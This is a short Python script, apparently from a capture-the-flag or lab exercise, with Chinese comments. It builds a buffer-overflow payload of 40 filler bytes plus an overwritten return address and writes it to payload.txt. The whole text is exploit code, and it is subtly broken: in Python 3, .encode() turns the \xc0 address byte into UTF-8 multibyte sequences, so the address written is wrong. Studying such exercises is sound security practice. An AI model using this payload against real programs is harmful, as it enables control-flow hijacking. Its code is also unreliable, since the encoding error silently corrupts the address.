# 构造攻击字符串
payload = "z" * 40 + "\xc0\x17\x40\x00"

# 将攻击字符串保存到文件
with open("payload.txt", "wb") as file:
    file.write(payload.encode())
